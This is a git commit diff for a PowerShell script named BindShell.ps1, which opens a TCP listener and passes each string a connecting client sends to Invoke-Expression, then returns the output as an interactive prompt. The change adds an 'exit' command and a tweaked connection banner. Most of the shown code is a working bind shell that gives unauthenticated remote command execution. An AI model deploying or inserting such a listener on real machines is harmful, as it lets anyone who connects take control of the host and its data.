cc0b7035ddfb40c60f396071dad49233412b5931
GLDXi <w.brodier@gmail.com>
2026-04-01 11:16:34 +0200

    Update BindShell.ps1

--- BindShell.ps1
+++ BindShell.ps1
@@ -7,18 +7,22 @@ $client = $listener.AcceptTcpClient()
 $stream = $client.GetStream()
 [byte[]]$buffer = New-Object byte[] 65536
 
-# if connexion established, send a message on the client side
-$message = "Connected to Bind Shell on port $port`nPS " + (Get-Location).Path + "> "
+
+$message = "[*] Connected to Bind Shell on port $port`nPS " + (Get-Location).Path + "> "
 $bytes = [System.Text.Encoding]::ASCII.GetBytes($message)
 $stream.Write($bytes, 0, $bytes.Length)
 
 while(($read = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
     $cmd = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $read)
-    $output = Invoke-Expression $cmd 2>&1 | Out-String
-    $response = $output + "PS " + (Get-Location).Path + "> "
-    $bytes = [System.Text.Encoding]::ASCII.GetBytes($response)
-    $stream.Write($bytes, 0, $bytes.Length)
-    $stream.Flush()
+    if ($cmd.Trim().ToLower() -eq "exit") {
+        break
+    } else {
+        $output = Invoke-Expression $cmd 2>&1 | Out-String
+        $response = $output + "PS " + (Get-Location).Path + "> "
+        $bytes = [System.Text.Encoding]::ASCII.GetBytes($response)
+        $stream.Write($bytes, 0, $bytes.Length)
+        $stream.Flush()
+    }
 }
 
 $client.Close()
